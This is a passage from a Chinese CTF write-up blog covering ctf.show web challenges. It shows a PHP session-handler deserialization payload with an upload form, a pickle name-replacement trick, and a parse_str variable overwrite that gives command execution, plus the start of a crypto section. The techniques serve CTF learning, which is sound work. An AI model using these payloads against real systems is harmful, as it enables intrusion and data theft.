<span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">log</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;/div>"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?php</span>    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'win'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token delimiter">?></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token delimiter">&lt;?php</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span>    <span class="token delimiter">&lt;?php</span>    <span class="token variable">$choices</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"Rock"</span><span class="token punctuation">,</span> <span class="token string">"Paper"</span><span class="token punctuation">,</span> <span class="token string">"Scissors"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$rand_bot</span> <span class="token operator">=</span> <span class="token function">array_rand</span><span class="token punctuation">(</span><span class="token variable">$choices</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$bot_input</span> <span class="token operator">=</span> <span class="token variable">$choices</span><span class="token punctuation">[</span><span class="token variable">$rand_bot</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"choice"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">AND</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"choice"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$choices</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$user_input</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"choice"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$Game</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">play</span><span class="token punctuation">(</span><span class="token variable">$user_input</span><span class="token punctuation">,</span><span class="token variable">$bot_input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">==</span><span class="token string">"You Win"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'win'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'win'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token delimiter">?></span>        <span class="token comment" spellcheck="true">//...</span>        <span class="token delimiter">&lt;?php</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'win'</span><span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"&lt;div>You need to win 100 rounds in a row to get flag.&lt;/div>"</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"Here is your flag:"</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里有一个很刻意的指出了ini_set(‘session.serialize_handler’, ‘php’);序列化handler可控，并且发现<strong>session.upload_progress.name</strong>为PHP_SESSION_UPLOAD_PROGRESS，很明显的phpsession差异导致的反序列化。</p><p>php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项<code>session.save_handler</code>来进行确定的，默认是以文件的方式存储。</p><p>如果在PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样，会导致安全问题。</p><p>这是因为当使用php引擎的时候，php引擎会以**|**作为key和value的分隔符。</p><p><a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/">以上内容节选自spoock师傅</a>.</p><p>以这道题为例。</p><p>由于session.upload_progress.name为PHP_SESSION_UPLOAD_PROGRESS，那么该session文件的内容是可控的，就是POST的filename。</p><p>上传页面：</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://a188d7a8-2a27-4c8f-bdb0-da187c09c567.challenge.ctf.show/<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>PHP_SESSION_UPLOAD_PROGRESS<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>123<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结合Game类的代码，我们把log设置为flag.php即可，序列化生成：</p><p>O:4:&quot;Game&quot;:2:{s:3:&quot;log&quot;;s:8:&quot;flag.php&quot;;s:4:&quot;name&quot;;s:8:&quot;Squirt1e&quot;;}</p><p>filename赋值为|O:4:&quot;Game&quot;:2:{s:3:&quot;log&quot;;s:8:&quot;flag.php&quot;;s:4:&quot;name&quot;;s:8:&quot;Squirt1e&quot;;}。、php引擎会以**|**作为key和value的分隔符</p><p>也就是’s:6:&quot;Squirt1e”;s:67:”‘&#x3D;&gt;’O:4:&quot;Game&quot;:2:{s:3:&quot;log&quot;;s:8:&quot;flag.php&quot;;s:4:&quot;name&quot;;s:8:&quot;Squirt1e&quot;;}’，从而在析构函数读取flag。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20221005224014534.png" alt="image-20221005224014534" style="zoom: 33%;" /><h4 id="baby-pickle"><a href="#baby-pickle" class="headerlink" title="baby_pickle"></a>baby_pickle</h4><pre class="line-numbers language-python"><code class="language-python">app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>id <span class="token operator">=</span> <span class="token number">0</span>flag <span class="token operator">=</span> <span class="token string">"ctfshow{"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"}"</span><span class="token keyword">class</span> <span class="token class-name">Rookie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">,</span> id<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>id <span class="token operator">=</span> id@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">agent_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> id    id <span class="token operator">=</span> id <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> <span class="token string">"new_rookie"</span>    new_rookie <span class="token operator">=</span> Rookie<span class="token punctuation">(</span>name<span class="token punctuation">,</span> id<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        file <span class="token operator">=</span> open<span class="token punctuation">(</span>str<span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"_info"</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span>        info <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>new_rookie<span class="token punctuation">,</span> protocol<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>        info <span class="token operator">=</span> pickletools<span class="token punctuation">.</span>optimize<span class="token punctuation">(</span>info<span class="token punctuation">)</span>        file<span class="token punctuation">.</span>write<span class="token punctuation">(</span>info<span class="token punctuation">)</span>        file<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"error"</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span>str<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"_info"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> file<span class="token punctuation">:</span>        user <span class="token operator">=</span> pickle<span class="token punctuation">.</span>load<span class="token punctuation">(</span>file<span class="token punctuation">)</span>    message <span class="token operator">=</span> user<span class="token punctuation">.</span>name <span class="token operator">+</span> <span class="token string">"&lt;/h1>\n&lt;p>"</span> <span class="token operator">+</span> <span class="token string">"只有成为大菜鸡才能得到flag"</span>    <span class="token keyword">return</span> message@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/dacaiji"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span>str<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"_info"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        user <span class="token operator">=</span> pickle<span class="token punctuation">.</span>load<span class="token punctuation">(</span>f<span class="token punctuation">)</span>    <span class="token keyword">if</span> user<span class="token punctuation">.</span>id <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>        message <span class="token operator">=</span> <span class="token string">"你不是大菜鸡"</span>        <span class="token keyword">return</span> message    <span class="token keyword">else</span><span class="token punctuation">:</span>        message <span class="token operator">=</span> <span class="token string">"恭喜你成为大菜鸡"</span> <span class="token operator">+</span> flag        <span class="token keyword">return</span> message@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/change"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">change_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    newname <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"newname"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    file <span class="token operator">=</span> open<span class="token punctuation">(</span>name<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"_info"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span>    info <span class="token operator">=</span> file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"old_info ===================="</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"name ===================="</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"newname ===================="</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>newname<span class="token punctuation">)</span>    info <span class="token operator">=</span> info<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>name<span class="token punctuation">,</span> newname<span class="token punctuation">)</span> <span class="token operator">//</span><span class="token operator">*</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span>    file<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span>name<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span> <span class="token string">"_info"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>info<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"success"</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8888</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>非预期了。pickle反序列化。然后注意到了info &#x3D; info.replace(name, newname)，只要让user.id&#x3D;0即可，假设第一次默认路由让id&#x3D;1，那么注册一个name&#x3D;2的用户，然后通过&#x2F;change改成0即可替换掉user.id。</p><p>注册用户2。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20221005225054520.png" alt="image-20221005225054520" style="zoom:50%;" /><p>修改用户名，注意base编码。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20221005225158916.png" alt="image-20221005225158916" style="zoom:50%;" /><p>访问&#x2F;dacaiji，这里没想明白为啥name没被替换成0。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20221005225223114.png" alt="image-20221005225223114" style="zoom:50%;" /><h4 id="repairman"><a href="#repairman" class="headerlink" title="repairman"></a>repairman</h4><p>hello,the user!We may change the mode to repaie the server,please keep it unchanged</p><p>让mode&#x3D;0，看到了代码。</p><pre class="line-numbers language-php"><code class="language-php">Your mode is the guest<span class="token operator">!</span>hello<span class="token punctuation">,</span>the repairman<span class="token operator">!</span> <span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'secret'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">Array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string">'config.php'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'secret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$secret</span> <span class="token operator">=</span><span class="token operator">&amp;</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'secret'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token keyword">Null</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$mode</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$mode</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'Your mode is the guest!'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">cmd</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">global</span> <span class="token variable">$secret</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">'Sucess change the ini!The logs record you!'</span><span class="token punctuation">;</span>    <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$secret</span><span class="token punctuation">[</span><span class="token string">'secret'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$secret</span><span class="token punctuation">;</span>    <span class="token variable">$secret</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'secret'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$secret</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$mode</span> <span class="token operator">==</span> <span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//echo var_dump($GLOBALS);</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$secret</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">.</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'secret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$secret</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">case</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">.</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'secret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">echo</span> <span class="token number">999</span><span class="token punctuation">;</span>                <span class="token function">cmd</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">.</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'secret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">echo</span> <span class="token number">666</span><span class="token punctuation">;</span>                <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/[^a-z0-9]/is'</span><span class="token punctuation">,</span> <span class="token string">'hacker'</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">cmd</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">default</span><span class="token punctuation">:</span>                <span class="token keyword">echo</span> <span class="token string">"hello,the repairman!"</span><span class="token punctuation">;</span>                <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$mode</span> <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'hello,the user!We may change the mode to repaie the server,please keep it unchanged'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'refresh:5;url=index.php?mode=1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        exit<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>传一个secret为MD5后的token即可执行exec，但是preg_replace只让传字母数字。</p><p>然后注意到 ，通过url传参给变量赋值，这里我们把config变量赋值成空就可以了，secret传md5后的admin值即可享受999帝王权限。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>exec无回显，写文件即可，flag藏在config.php中。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20221005225937220.png" alt="image-20221005225937220"></p><p>访问a.txt</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'serect'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string">'ctfshow{4439affe-320c-4865-98ab-3650a3483fca}'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h3><h4 id="easy-base"><a href="#easy-base" class="headerlink" title="easy_base"></a>easy_base</h4><p>翻转，base64解密即可。</p><h4 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    text<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'y'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token string">'t'</span><span class="token punctuation">,</span> <span class="token string">'x'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'i'</span><span class="token punctuation">,</span> <span class="token string">'{'</span><span class="token punctuation">,</span> <span class="token string">'y'</span><span class="token punctuation">,</span> <span class="token string">'x'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'t'</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">,</span> <span class="token string">'u'</span><span class="token punctuation">,</span> <span class="token string">'t'</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">,</span> <span class="token string">'z'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span 